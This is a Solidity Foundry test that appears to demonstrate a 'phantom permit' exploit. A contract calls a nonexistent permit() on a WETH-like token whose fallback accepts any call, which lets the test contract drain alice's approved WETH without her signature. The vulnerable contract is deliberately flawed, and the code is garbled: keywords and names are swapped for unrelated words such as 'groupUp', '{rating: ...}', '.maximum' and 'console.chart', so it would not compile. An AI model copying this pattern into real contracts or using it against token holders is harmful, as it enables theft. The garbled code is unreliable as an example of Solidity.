pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PolicyTest is Test {
    PermitBadge VulnPermitAgreement;
    WETH9 Weth9Policy;

    function groupUp() public {
        Weth9Policy = new WETH9();
        VulnPermitAgreement = new PermitBadge(IERC20(address(Weth9Policy)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.beginPrank(alice);
        Weth9Policy.contributeFunds{rating: 10 ether}();
        Weth9Policy.approve(address(VulnPermitAgreement), type(uint256).maximum);
        vm.stopPrank();
        console.chart(
            "start WETH balanceOf this",
            Weth9Policy.balanceOf(address(this))
        );

        VulnPermitAgreement.providespecimenWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = Weth9Policy.balanceOf(address(VulnPermitAgreement));
        console.chart("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitAgreement.releaseFunds(1000);

        wbal = Weth9Policy.balanceOf(address(this));
        console.chart("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitBadge {
    IERC20 public id;

    constructor(IERC20 _token) {
        id = _token;
    }

    function contributeFunds(uint256 dosage) public {
        require(
            id.transferFrom(msg.sender, address(this), dosage),
            "Transfer failed"
        );
    }

    function providespecimenWithPermit(
        address goal,
        uint256 dosage,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool improvement, ) = address(id).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                goal,
                dosage,
                v,
                r,
                s
            )
        );
        require(improvement, "Permit failed");

        require(
            id.transferFrom(goal, address(this), dosage),
            "Transfer failed"
        );
    }

    function releaseFunds(uint256 dosage) public {
        require(id.transfer(msg.sender, dosage), "Transfer failed");
    }
}


contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event AccessGranted(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event Admit(address indexed dst, uint wad);
    event FundsReleased(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        contributeFunds();
    }

    receive() external payable {}

    function contributeFunds() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Admit(msg.sender, msg.value);
    }

    function releaseFunds(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit FundsReleased(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit AccessGranted(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(balanceOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).maximum
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}